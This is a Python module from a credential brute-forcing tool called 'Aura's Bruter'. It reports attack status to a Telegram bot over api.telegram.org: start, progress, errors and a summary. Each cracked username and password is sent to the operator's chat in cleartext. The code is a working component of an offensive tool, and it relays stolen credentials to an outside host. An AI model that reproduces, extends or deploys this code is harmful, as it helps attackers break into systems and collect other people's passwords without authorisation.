#!/usr/bin/env python3
"""
Aura's Bruter - Telegram Bot Integration (Optional)
Send attack status and results via Telegram
"""

import asyncio
import threading
import time
import queue
from datetime import datetime
from typing import Optional, Dict, Any, List
from dataclasses import dataclass
import socket


@dataclass
class TelegramConfig:
    """Telegram bot configuration."""
    enabled: bool = False
    bot_token: str = ""
    chat_id: str = ""
    send_progress: bool = True  # Send periodic progress updates
    send_found: bool = True     # Send when credentials found
    send_errors: bool = True    # Send critical errors
    send_summary: bool = True   # Send final summary
    progress_interval: int = 60  # Seconds between progress updates


class TelegramBot:
    """
    Optional Telegram integration for monitoring attacks.
    Uses aiohttp directly to avoid telegram-bot library complexities.
    All operations are async and queued to avoid blocking.
    """
    
    def __init__(self, config: TelegramConfig):
        self.config = config
        self._queue: queue.Queue = queue.Queue()
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self._last_progress_time = 0
        self._internet_available = True
        self._error_count = 0
        self._max_errors = 5  # Disable after this many consecutive errors
    
    @staticmethod
    def check_internet(timeout: float = 3.0) -> bool:
        """Check if internet is available."""
        try:
            # Try to connect to Telegram's API server
            socket.create_connection(("api.telegram.org", 443), timeout=timeout)
            return True
        except (socket.timeout, socket.error, OSError):
            return False
    
    def start(self):
        """Start the message sender thread."""
        if not self.config.enabled or not self.config.bot_token:
            return
        
        # Check internet first
        self._internet_available = self.check_internet()
        if not self._internet_available:
            return
        
        self._running = True
        self._thread = threading.Thread(target=self._sender_loop, daemon=True)
        self._thread.start()
    
    def stop(self):
        """Stop the sender thread."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=2)
    
    def _sender_loop(self):
        """Background thread that sends queued messages."""
        while self._running:
            try:
                # Get message with timeout
                try:
                    message = self._queue.get(timeout=1)
                except queue.Empty:
                    continue
                
                # Check internet periodically
                if not self._internet_available:
                    self._internet_available = self.check_internet()
                    if not self._internet_available:
                        continue
                
                # Send message
                success = self._send_sync(message)
                
                if success:
                    self._error_count = 0
                else:
                    self._error_count += 1
                    if self._error_count >= self._max_errors:
                        self._running = False
                
                # Rate limit
                time.sleep(0.5)
                
            except Exception:
                self._error_count += 1
    
    def _send_sync(self, text: str) -> bool:
        """Send message synchronously using urllib (no external deps needed)."""
        try:
            import urllib.request
            import urllib.parse
            import json
            
            url = f"https://api.telegram.org/bot{self.config.bot_token}/sendMessage"
            data = {
                "chat_id": self.config.chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            
            encoded_data = urllib.parse.urlencode(data).encode('utf-8')
            
            req = urllib.request.Request(url, data=encoded_data)
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            
            with urllib.request.urlopen(req, timeout=10) as response:
                result = json.loads(response.read().decode())
                return result.get("ok", False)
                
        except Exception:
            self._internet_available = False
            return False
    
    def send(self, text: str, force: bool = False):
        """Queue a message for sending."""
        if not self.config.enabled or not self._running:
            return
        
        if not self._internet_available and not force:
            return
        
        self._queue.put(text)
    
    def send_progress(self, stats: Dict[str, Any]):
        """Send progress update (rate-limited)."""
        if not self.config.send_progress:
            return
        
        now = time.time()
        if now - self._last_progress_time < self.config.progress_interval:
            return
        
        self._last_progress_time = now
        
        message = (
            f"📊 <b>Attack Progress</b>\n\n"
            f"🎯 Target: {stats.get('target', 'N/A')}\n"
            f"📡 Protocol: {stats.get('protocol', 'N/A').upper()}\n"
            f"⏱ Status: {stats.get('stage', 'unknown')}\n\n"
            f"📈 Progress: {stats.get('progress', '0%')}\n"
            f"🔢 Tested: {stats.get('tested', 0):,} / {stats.get('total', 0):,}\n"
            f"⚡ Rate: {stats.get('rate', '0/s')}\n"
            f"⏳ Elapsed: {stats.get('elapsed', '00:00:00')}\n"
        )
        
        if stats.get('found', 0) > 0:
            message += f"\n🔓 Found: {stats['found']} credential(s)"
        
        if stats.get('last_error'):
            message += f"\n⚠️ Last error: {stats['last_error']}"
        
        self.send(message)
    
    def send_found(self, username: str, password: str, target: str):
        """Send notification when credentials found."""
        if not self.config.send_found:
            return
        
        message = (
            f"🔓 <b>CREDENTIALS FOUND!</b>\n\n"
            f"🎯 Target: {target}\n"
            f"👤 Username: <code>{username}</code>\n"
            f"🔑 Password: <code>{password}</code>\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        self.send(message)
    
    def send_error(self, error: str, target: str):
        """Send critical error notification."""
        if not self.config.send_errors:
            return
        
        message = (
            f"❌ <b>Attack Error</b>\n\n"
            f"🎯 Target: {target}\n"
            f"⚠️ Error: {error}\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        self.send(message)
    
    def send_summary(self, stats: Dict[str, Any]):
        """Send final attack summary."""
        if not self.config.send_summary:
            return
        
        status_emoji = "✅" if stats.get('stage') == 'completed' else "⚠️"
        
        message = (
            f"{status_emoji} <b>Attack {stats.get('stage', 'Finished').title()}</b>\n\n"
            f"🎯 Target: {stats.get('target', 'N/A')}\n"
            f"📡 Protocol: {stats.get('protocol', 'N/A').upper()}\n\n"
            f"📊 <b>Summary:</b>\n"
            f"  • Tested: {stats.get('tested', 0):,} attempts\n"
            f"  • Duration: {stats.get('elapsed', '00:00:00')}\n"
            f"  • Avg Rate: {stats.get('rate', '0/s')}\n"
        )
        
        found = stats.get('found', 0)
        if found > 0:
            message += f"\n🔓 <b>Found {found} credential(s):</b>\n"
            for cred in stats.get('credentials', []):
                message += f"  • {cred['username']}:{cred['password']}\n"
        else:
            message += "\n🔒 No credentials found."
        
        self.send(message)
    
    def send_start(self, target: str, protocol: str, total: int):
        """Send attack start notification."""
        message = (
            f"🚀 <b>Attack Started</b>\n\n"
            f"🎯 Target: {target}\n"
            f"📡 Protocol: {protocol.upper()}\n"
            f"🔢 Total attempts: {total:,}\n"
            f"⏰ Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        self.send(message)
    
    @property
    def is_available(self) -> bool:
        """Check if Telegram is available."""
        return self.config.enabled and self._running and self._internet_available
    
    @property
    def status(self) -> str:
        """Get human-readable status."""
        if not self.config.enabled:
            return "Disabled"
        if not self._internet_available:
            return "No Internet"
        if not self._running:
            return "Stopped"
        return "Active"


def create_from_config(config_dict: Dict[str, Any]) -> TelegramBot:
    """Create TelegramBot from config dictionary."""
    telegram_cfg = config_dict.get("telegram", {})
    
    return TelegramBot(TelegramConfig(
        enabled=telegram_cfg.get("enabled", False),
        bot_token=telegram_cfg.get("token", ""),
        chat_id=telegram_cfg.get("chat_id", ""),
        send_progress=telegram_cfg.get("send_progress", True),
        send_found=telegram_cfg.get("send_found", True),
        send_errors=telegram_cfg.get("send_errors", True),
        send_summary=telegram_cfg.get("send_summary", True),
        progress_interval=telegram_cfg.get("progress_interval", 60)
    ))


if __name__ == "__main__":
    from rich.console import Console
    from rich.panel import Panel
    
    console = Console()
    
    console.print(Panel(
        "[cyan]Telegram Bot Module[/cyan]\n\n"
        "This module provides optional Telegram integration.\n\n"
        "[dim]To enable, configure in Settings > Notifications:\n"
        "  - Bot Token (from @BotFather)\n"
        "  - Chat ID (your Telegram user ID)\n\n"
        "The bot will send:\n"
        "  - Attack start notification\n"
        "  - Periodic progress updates\n"
        "  - Found credentials alerts\n"
        "  - Final summary\n\n"
        "If no Internet is available, messages are silently skipped.[/dim]",
        title="[yellow]Telegram Integration[/yellow]"
    ))
